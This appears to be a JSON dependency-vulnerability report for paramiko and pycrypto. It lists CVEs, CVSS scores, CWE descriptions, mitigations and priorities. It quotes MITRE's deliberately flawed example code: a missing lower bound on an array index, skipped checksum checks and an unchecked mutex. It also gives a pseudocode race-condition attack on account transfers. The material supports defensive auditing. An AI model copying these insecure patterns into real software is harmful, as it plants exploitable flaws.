                    "@Nature": "Bad",
                    "@Language": "C",
                    "xhtml:div": {
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "xhtml:br": [
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null
                          ],
                          "xhtml:i": [
                            "// check that the array index is less than the maximum",
                            "// length of the array",
                            "// if array index is invalid then output error message",
                            "// and return value indicating error"
                          ],
                          "xhtml:div": [
                            {
                              "@style": "margin-left:1em;",
                              "xhtml:div": {
                                "xhtml:i": "// get the value at the specified index of the array",
                                "xhtml:br": null,
                                "#text": "value = array[index];"
                              }
                            },
                            {
                              "@style": "margin-left:1em;",
                              "xhtml:br": null,
                              "#text": "printf(\"Value is: %d\\n\", array[index]);value = -1;"
                            }
                          ],
                          "#text": "int value;\n                           \n                           \n                           \n                           \n                           \n                           if (index < len) {}\n                           \n                           \n                           \n                           else {}\n                           return value;"
                        }
                      },
                      "#text": "int getValueFromArray(int *array, int len, int index) {}"
                    }
                  },
                  {
                    "@Nature": "Good",
                    "@Language": "C",
                    "xhtml:div": {
                      "xhtml:br": [
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null
                      ],
                      "xhtml:i": [
                        "// check that the array index is within the correct",
                        "// range of values for the array"
                      ],
                      "#text": "...\n                     \n                     \n                     \n                     \n                     \n                     if (index >= 0 && index < len) {\n                     ..."
                    }
                  }
                ],
                "Body_Text": "However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below."
              },
              {
                "Intro_Text": "Windows provides the _mbs family of functions to perform various operations on multibyte strings. When these functions are passed a malformed multibyte string, such as a string containing a valid leading byte followed by a single null byte, they can read or write past the end of the string buffer causing a buffer overflow. The following functions all pose a risk of buffer overflow: _mbsinc _mbsdec _mbsncat _mbsncpy _mbsnextc _mbsnset _mbsrev _mbsset _mbsstr _mbstok _mbccpy _mbslen"
              }
            ]
          }
        ]
      },
      "priority": 5.13
    },
    {
      "affected_component": "paramiko",
      "affected_component_version": "2.4.0",
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2023-48795",
        "name": "CVE-2023-48795",
        "description": "The SSH transport protocol with certain OpenSSH extensions, found in OpenSSH before 9.6 and other products, allows remote attackers to bypass integrity checks such that some packets are omitted (from the extension negotiation message), and a client and server may consequently end up with a connection for which some security features have been downgraded or disabled, aka a Terrapin attack. This occurs because the SSH Binary Packet Protocol (BPP), implemented by these extensions, mishandles the handshake phase and mishandles use of sequence numbers. For example, there is an effective attack against SSH's use of ChaCha20-Poly1305 (and CBC with Encrypt-then-MAC). The bypass occurs in chacha20-poly1305@openssh.com and (if CBC is used) the -etm@openssh.com MAC algorithms. This also affects Maverick Synergy Java SSH API before 3.1.0-SNAPSHOT, Dropbear through 2022.83, Ssh before 5.1.1 in Erlang/OTP, PuTTY before 0.80, AsyncSSH before 2.14.2, golang.org/x/crypto before 0.17.0, libssh before 0.10.6, libssh2 through 1.11.0, Thorn Tech SFTP Gateway before 3.4.6, Tera Term before 5.1, Paramiko before 3.4.0, jsch before 0.2.15, SFTPGo before 2.5.6, Netgate pfSense Plus through 23.09.1, Netgate pfSense CE through 2.7.2, HPN-SSH through 18.2.0, ProFTPD before 1.3.8b (and before 1.3.9rc2), ORYX CycloneSSH before 2.3.4, NetSarang XShell 7 before Build 0144, CrushFTP before 10.6.0, ConnectBot SSH library before 2.2.22, Apache MINA sshd through 2.11.0, sshj through 0.37.0, TinySSH through 20230101, trilead-ssh2 6401, LANCOM LCOS and LANconfig, FileZilla before 3.66.4, Nova before 11.8, PKIX-SSH before 14.4, SecureCRT before 9.4.3, Transmit5 before 5.10.4, Win32-OpenSSH before 9.5.0.0p1-Beta, WinSCP before 6.2.2, Bitvise SSH Server before 9.32, Bitvise SSH Client before 9.33, KiTTY through 0.76.1.13, the net-ssh gem 7.2.0 for Ruby, the mscdex ssh2 module before 1.15.0 for Node.js, the thrussh library before 0.35.1 for Rust, and the Russh crate before 0.40.2 for Rust.",
        "cvss": {
          "vuln_impact": 3.6,
          "attack_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
        },
        "cwes": [
          {
            "@id": "https://cwe.mitre.org/data/definitions/354.html",
            "name": "354",
            "description": "Improper validation of checksums before use results in an unnecessary risk that can easily be mitigated. The protocol specification describes the algorithm used for calculating the checksum. It is then a simple matter of implementing the calculation and verifying that the calculated checksum and the received checksum match. Improper verification of the calculated checksum and the received checksum can lead to far greater consequences.",
            "consequences": [
              {
                "Scope": [
                  "Integrity",
                  "Other"
                ],
                "Impact": [
                  "Modify Application Data",
                  "Other"
                ],
                "Note": "Integrity checks usually use a secret key that helps authenticate the data origin. Skipping integrity checking generally opens up the possibility that new data from an invalid source can be injected."
              },
              {
                "Scope": [
                  "Integrity",
                  "Other"
                ],
                "Impact": "Other",
                "Note": "Data that is parsed and used may be corrupted."
              },
              {
                "Scope": [
                  "Non-Repudiation",
                  "Other"
                ],
                "Impact": [
                  "Hide Activities",
                  "Other"
                ],
                "Note": "Without a checksum check, it is impossible to determine if any changes have been made to the data after it was sent."
              }
            ],
            "potential_mitigations": {
              "Phase": "Implementation",
              "Description": "Ensure that the checksums present in messages are properly checked in accordance with the protocol specification before they are parsed and used."
            },
            "demonstrative_examples": {
              "Intro_Text": "The following example demonstrates the weakness.",
              "Example_Code": [
                {
                  "@Nature": "Bad",
                  "@Language": "C",
                  "xhtml:div": {
                    "xhtml:br": [
                      null,
                      null,
                      null,
                      null
                    ],
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "xhtml:br": [
                          null,
                          null,
                          null
                        ],
                        "#text": "memset(msg, 0x0, MAX_MSG);clilen = sizeof(cli);if (inet_ntoa(cli.sin_addr)==...) n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);"
                      }
                    },
                    "#text": "sd = socket(AF_INET, SOCK_DGRAM, 0); serv.sin_family = AF_INET;serv.sin_addr.s_addr = htonl(INADDR_ANY);servr.sin_port = htons(1008);bind(sd, (struct sockaddr *) & serv, sizeof(serv));while (1) {}"
                  }
                },
                {
                  "@Nature": "Bad",
                  "@Language": "Java",
                  "xhtml:div": {
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:br": null,
                      "#text": "DatagramPacket packet = new DatagramPacket(data,data.length,IPAddress, port);socket.send(sendPacket);"
                    },
                    "#text": "while(true) {}"
                  }
                }
              ]
            }
          }
        ]
      },
      "reachable_code": [
        {
          "path_to_file": "vulnerability_assisting_information/main/files/paramiko_test.py",
          "used_artifacts": [
            {
              "artifact_name": "Transport",
              "used_in_lines": [
                3,
                21
              ]
            }
          ]
        }
      ],
      "priority": 4.52
    },
    {
      "affected_component": "paramiko",
      "affected_component_version": "2.4.0",
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2022-24302",
        "name": "CVE-2022-24302",
        "description": "In Paramiko before 2.10.1, a race condition (between creation and chmod) in the write_private_key_file function could allow unauthorized information disclosure.",
        "cvss": {
          "vuln_impact": 3.6,
          "attack_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
        },
        "cwes": [
          {
            "@id": "https://cwe.mitre.org/data/definitions/362.html",
            "name": "362",
            "description": {
              "xhtml:p": [
                "This can have security implications when the expected synchronization is in security-critical code, such as recording whether a user is authenticated or modifying important state information that should not be influenced by an outsider.",
                "A race condition occurs within concurrent environments, and is effectively a property of a code sequence. Depending on the context, a code sequence may be in the form of a function call, a small number of instructions, a series of program invocations, etc.",
                "A race condition violates these properties, which are closely related:",
                "A race condition exists when an \"interfering code sequence\" can still access the shared resource, violating exclusivity. Programmers may assume that certain code sequences execute too quickly to be affected by an interfering code sequence; when they are not, this violates atomicity. For example, the single \"x++\" statement may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read (the original value of x), followed by a computation (x+1), followed by a write (save the result to x).",
                "The interfering code sequence could be \"trusted\" or \"untrusted.\" A trusted interfering code sequence occurs within the product; it cannot be modified by the attacker, and it can only be invoked indirectly. An untrusted interfering code sequence can be authored directly by the attacker, and typically it is external to the vulnerable product."
              ],
              "xhtml:ul": {
                "xhtml:li": [
                  "Exclusivity - the code sequence is given exclusive access to the shared resource, i.e., no other code sequence can modify properties of the shared resource before the original sequence has completed execution.",
                  "Atomicity - the code sequence is behaviorally atomic, i.e., no other thread or process can concurrently execute the same sequence of instructions (or a subset) against the same resource."
                ]
              }
            },
            "consequences": [
              {
                "Scope": "Availability",
                "Impact": [
                  "DoS: Resource Consumption (CPU)",
                  "DoS: Resource Consumption (Memory)",
                  "DoS: Resource Consumption (Other)"
                ],
                "Note": "When a race condition makes it possible to bypass a resource cleanup routine or trigger multiple initialization routines, it may lead to resource exhaustion (CWE-400)."
              },
              {
                "Scope": "Availability",
                "Impact": [
                  "DoS: Crash, Exit, or Restart",
                  "DoS: Instability"
                ],
                "Note": "When a race condition allows multiple control flows to access a resource simultaneously, it might lead the product(s) into unexpected states, possibly resulting in a crash."
              },
              {
                "Scope": [
                  "Confidentiality",
                  "Integrity"
                ],
                "Impact": [
                  "Read Files or Directories",
                  "Read Application Data"
                ],
                "Note": "When a race condition is combined with predictable resource names and loose permissions, it may be possible for an attacker to overwrite or access confidential data (CWE-59)."
              }
            ],
            "detection_methods": [
              {
                "Method": "Black Box",
                "Description": "Black box methods may be able to identify evidence of race conditions via methods such as multiple simultaneous connections, which may cause the software to become instable or crash. However, race conditions with very narrow timing windows would not be detectable."
              },
              {
                "Method": "White Box",
                "Description": "Common idioms are detectable in white box analysis, such as time-of-check-time-of-use (TOCTOU) file operations (CWE-367), or double-checked locking (CWE-609)."
              },
              {
                "@Detection_Method_ID": "DM-2",
                "Method": "Automated Dynamic Analysis",
                "Description": {
                  "xhtml:p": [
                    "This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.",
                    "Race conditions may be detected with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.",
                    "Insert breakpoints or delays in between relevant code statements to artificially expand the race window so that it will be easier to detect."
                  ]
                },
                "Effectiveness": "Moderate"
              },
              {
                "Method": "Automated Static Analysis - Binary or Bytecode",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      "Highly cost effective:",
                      "Cost effective for partial coverage:"
                    ],
                    "xhtml:ul": [
                      {
                        "xhtml:li": "Bytecode Weakness Analysis - including disassembler + source code weakness analysis"
                      },
                      {
                        "xhtml:li": "Binary Weakness Analysis - including disassembler + source code weakness analysis"
                      }
                    ]
                  }
                },
                "Effectiveness": "High"
              },
              {
                "Method": "Dynamic Analysis with Automated Results Interpretation",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Web Application Scanner",
                        "Web Services Scanner",
                        "Database Scanners"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Dynamic Analysis with Manual Results Interpretation",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      "Highly cost effective:",
                      "Cost effective for partial coverage:"
                    ],
                    "xhtml:ul": [
                      {
                        "xhtml:li": "Framework-based Fuzzer"
                      },
                      {
                        "xhtml:li": [
                          "Fuzz Tester",
                          "Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious"
                        ]
                      }
                    ]
                  }
                },
                "Effectiveness": "High"
              },
              {
                "Method": "Manual Static Analysis - Source Code",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      "Highly cost effective:",
                      "Cost effective for partial coverage:"
                    ],
                    "xhtml:ul": [
                      {
                        "xhtml:li": "Manual Source Code Review (not inspections)"
                      },
                      {
                        "xhtml:li": "Focused Manual Spotcheck - Focused manual analysis of source"
                      }
                    ]
                  }
                },
                "Effectiveness": "High"
              },
              {
                "Method": "Automated Static Analysis - Source Code",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Highly cost effective:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Source code Weakness Analyzer",
                        "Context-configured Source Code Weakness Analyzer"
                      ]
                    }
                  }
                },
                "Effectiveness": "High"
              },
              {
                "Method": "Architecture or Design Review",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      "Highly cost effective:",
                      "Cost effective for partial coverage:"
                    ],
                    "xhtml:ul": [
                      {
                        "xhtml:li": "Formal Methods / Correct-By-Construction"
                      },
                      {
                        "xhtml:li": "Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)"
                      }
                    ]
                  }
                },
                "Effectiveness": "High"
              }
            ],
            "potential_mitigations": [
              {
                "Phase": "Architecture and Design",
                "Description": "In languages that support it, use synchronization primitives. Only wrap these around critical code to minimize the impact on performance."
              },
              {
                "Phase": "Architecture and Design",
                "Description": "Use thread-safe capabilities such as the data access abstraction in Spring."
              },
              {
                "Phase": "Architecture and Design",
                "Description": {
                  "xhtml:p": [
                    "Minimize the usage of shared resources in order to remove as much complexity as possible from the control flow and to reduce the likelihood of unexpected conditions occurring.",
                    "Additionally, this will minimize the amount of synchronization necessary and may even help to reduce the likelihood of a denial of service where an attacker may be able to repeatedly trigger a critical section (CWE-400)."
                  ]
                }
              },
              {
                "Phase": "Implementation",
                "Description": "When using multithreading and operating on shared variables, only use thread-safe functions."
              },
              {
                "Phase": "Implementation",
                "Description": "Use atomic operations on shared variables. Be wary of innocent-looking constructs such as \"x++\". This may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read, followed by a computation, followed by a write."
              },
              {
                "Phase": "Implementation",
                "Description": "Use a mutex if available, but be sure to avoid related weaknesses such as CWE-412."
              },
              {
                "Phase": "Implementation",
                "Description": "Avoid double-checked locking (CWE-609) and other implementation errors that arise when trying to avoid the overhead of synchronization."
              },
              {
                "Phase": "Implementation",
                "Description": "Disable interrupts or signals over critical parts of the code, but also make sure that the code does not go into a large or infinite loop."
              },
              {
                "Phase": "Implementation",
                "Description": "Use the volatile type modifier for critical variables to avoid unexpected compiler optimization or reordering. This does not necessarily solve the synchronization problem, but it can help."
              },
              {
                "@Mitigation_ID": "MIT-17",
                "Phase": [
                  "Architecture and Design",
                  "Operation"
                ],
                "Strategy": "Environment Hardening",
                "Description": "Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."
              }
            ],
            "demonstrative_examples": [
              {
                "Intro_Text": "This code could be used in an e-commerce application that supports transfers between accounts. It takes the total amount of the transfer, sends it to the new account, and deducts the amount from the original account.",
                "Example_Code": [
                  {
                    "@Nature": "Bad",
                    "@Language": "Perl",
                    "xhtml:div": {
                      "xhtml:br": [
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null
                      ],
                      "xhtml:div": [
                        {
                          "@style": "margin-left:1em;",
                          "#text": "FatalError(\"Bad Transfer Amount\");"
                        },
                        {
                          "@style": "margin-left:1em;",
                          "#text": "FatalError(\"Insufficient Funds\");"
                        }
                      ],
                      "#text": "$transfer_amount = GetTransferAmount();$balance = GetBalanceFromDatabase();\n                     if ($transfer_amount < 0) {}$newbalance = $balance - $transfer_amount;if (($balance - $transfer_amount) < 0) {}SendNewBalanceToDatabase($newbalance);NotifyUser(\"Transfer of $transfer_amount succeeded.\");NotifyUser(\"New balance: $newbalance\");"
                    }
                  },
                  {
                    "@Nature": "Attack",
                    "@Language": "Other",
                    "xhtml:div": {
                      "xhtml:br": [
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null
                      ],
                      "#text": "In the following pseudocode, the attacker makes two simultaneous calls of the program, CALLER-1 and CALLER-2. Both callers are for the same user account.CALLER-1 (the attacker) is associated with PROGRAM-1 (the instance that handles CALLER-1). CALLER-2 is associated with PROGRAM-2.CALLER-1 makes a transfer request of 80.00.PROGRAM-1 calls GetBalanceFromDatabase and sets $balance to 100.00PROGRAM-1 calculates $newbalance as 20.00, then calls SendNewBalanceToDatabase().Due to high server load, the PROGRAM-1 call to SendNewBalanceToDatabase() encounters a delay.CALLER-2 makes a transfer request of 1.00.PROGRAM-2 calls GetBalanceFromDatabase() and sets $balance to 100.00. This happens because the previous PROGRAM-1 request was not processed yet.PROGRAM-2 determines the new balance as 99.00.After the initial delay, PROGRAM-1 commits its balance to the database, setting it to 20.00.PROGRAM-2 sends a request to update the database, setting the balance to 99.00"
                    }
                  }
                ],
                "Body_Text": [
                  "A race condition could occur between the calls to GetBalanceFromDatabase() and SendNewBalanceToDatabase().",
                  "Suppose the balance is initially 100.00. An attack could be constructed as follows:",
                  "At this stage, the attacker should have a balance of 19.00 (due to 81.00 worth of transfers), but the balance is 99.00, as recorded in the database.",
                  "To prevent this weakness, the programmer has several options, including using a lock to prevent multiple simultaneous requests to the web application, or using a synchronization mechanism that includes all the code between GetBalanceFromDatabase() and SendNewBalanceToDatabase()."
                ]
              },
              {
                "@Demonstrative_Example_ID": "DX-24",
                "Intro_Text": "The following function attempts to acquire a lock in order to perform operations on a shared resource.",
                "Example_Code": [
                  {
                    "@Nature": "Bad",
                    "@Language": "C",
                    "xhtml:div": {
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "xhtml:br": [
                            null,
                            null,
                            null,
                            null,
                            null
                          ],
                          "xhtml:i": "/* access shared resource */",
                          "#text": "pthread_mutex_lock(mutex);\n                           \n                           \n                           \n                           \n                           pthread_mutex_unlock(mutex);"
                        }
                      },
                      "#text": "void f(pthread_mutex_t *mutex) {}"
                    }
                  },
                  {
                    "@Nature": "Good",
                    "@Language": "C",
                    "xhtml:div": {
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "xhtml:br": [
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null
                          ],
                          "xhtml:div": {
                            "@style": "margin-left:1em;",
                            "#text": "return result;"
                          },
                          "xhtml:i": "/* access shared resource */",
                          "#text": "int result;\n                           result = pthread_mutex_lock(mutex);if (0 != result)\n                           \n                           \n                           \n                           \n                           \n                           return pthread_mutex_unlock(mutex);"
                        }
                      },
                      "#text": "int f(pthread_mutex_t *mutex) {}"
                    }
                  }
                ],
                "Body_Text": [
                  "However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.",
                  "In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels."
                ]
              },
              {
                "@Demonstrative_Example_ID": "DX-132",
                "Intro_Text": "Suppose a processor's Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of \"accessible\" memory. Any time this accessible range changes (as per the processor's boot status), the main MMU sends an update message to all the shadow MMUs.",
                "Body_Text": "Suppose the interconnect fabric does not prioritize such \"update\" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario."
              }
            ]
          }
        ]
      },
      "priority": 3.52
    },
    {
      "affected_component": "pycrypto",
      "affected_component_version": "2.0.1",
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2018-6594",
        "name": "CVE-2018-6594",
        "description": "lib/Crypto/PublicKey/ElGamal.py in PyCrypto through 2.6.1 generates weak ElGamal key parameters, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for PyCrypto's ElGamal implementation.",
        "cvss": {
          "vuln_impact": 3.6,
          "attack_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
        },
        "cwes": [
          {
            "@id": "https://cwe.mitre.org/data/definitions/326.html",
            "name": "326",
            "description": "A weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources.",
            "consequences": {
              "Scope": [
                "Access Control",
                "Confidentiality"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Read Application Data"
              ],
              "Note": "An attacker may be able to decrypt the data using brute force attacks."
            },
            "detection_methods": {
              "@Detection_Method_ID": "DM-14",
              "Method": "Automated Static Analysis",
              "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
              "Effectiveness": "High"
            },
            "potential_mitigations": {
              "Phase": "Architecture and Design",
              "Description": "Use an encryption scheme that is currently considered to be strong by experts in the field."
            }
          }
        ]
      },
      "priority": 3.52
    },
    {
      "affected_component": "pycrypto",
      "affected_component_version": "2.0.1",
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2012-2417",
        "name": "CVE-2012-2417",
        "description": "PyCrypto before 2.6 does not produce appropriate prime numbers when using an ElGamal scheme to generate a key, which reduces the signature space or public key space and makes it easier for attackers to conduct brute force attacks to obtain the private key.",
        "cvss": {
          "vuln_impact": 2.9,
          "attack_vector": "AV:N/AC:M/Au:N/C:N/I:P/A:N"
        }
      },
      "exploits": [
        {
          "@id": "https://www.seebug.org/vuldb/ssvid-60160",
          "description": "BUGTRAQ  ID: 53687\r\nCVE ID: CVE-2012-2417\r\n\r\nPyCrypto\u662f\u4f7f\u7528Python\u7f16\u5199\u7684\u52a0\u5bc6\u5de5\u5177\u5305\u3002\r\n\r\nPyCrypto 2.5\u4e4b\u524d\u7248\u672c\u5728\u4f7f\u7528ElGamal\u65b9\u6848\u751f\u6210\u5bc6\u94a5\u65f6\u5b58\u5728\u9519\u8bef\uff0c\u53ef\u9020\u6210\u7f29\u51cf\u5bc6\u94a5\u7a7a\u95f4\uff0c\u53ef\u88ab\u5229\u7528\u751f\u6210\u79c1\u94a5\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002\n0\npython 2.5.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPython\r\n------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nwww.python.org",
          "payload": ""
        }
      ],
      "priority": 3.03
    },
    {
      "affected_component": "pycrypto",
      "affected_component_version": "2.0.1",
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2013-1445",
        "name": "CVE-2013-1445",
        "description": "The Crypto.Random.atfork function in PyCrypto before 2.6.1 does not properly reseed the pseudo-random number generator (PRNG) before allowing a child process to access it, which makes it easier for context-dependent attackers to obtain sensitive information by leveraging a race condition in which a child process is created and accesses the PRNG within the same rate-limit period as another process.",
        "cvss": {
          "vuln_impact": 2.9,
          "attack_vector": "AV:N/AC:M/Au:N/C:P/I:N/A:N"
        }
      },
      "priority": 2.03
    }
  ]
}